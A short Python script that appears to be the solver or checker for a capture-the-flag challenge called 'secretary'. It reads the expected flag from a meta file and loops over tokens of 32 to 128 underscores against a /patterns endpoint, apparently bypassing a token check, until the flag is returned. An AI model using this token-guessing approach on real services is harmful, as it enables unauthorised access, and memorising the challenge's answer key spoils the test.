import http
import yaml
import logging
import requests
import argparse
from pathlib import Path

logger = logging.getLogger("secretary")

# Load the flag dynamically from the meta file
HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


def test(url):
    flag = None
    for i in range(32, 129):
        res = requests.get(f"{url}/patterns?token={i * '_'}", allow_redirects=False)
        if res.status_code == http.HTTPStatus.OK:
            flag = res.text
            break

    assert FLAG in flag, flag

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    parser = argparse.ArgumentParser()
    parser.add_argument("url", default="http://localhost:5000", nargs="?")
    args = parser.parse_args()
    test(args.url)
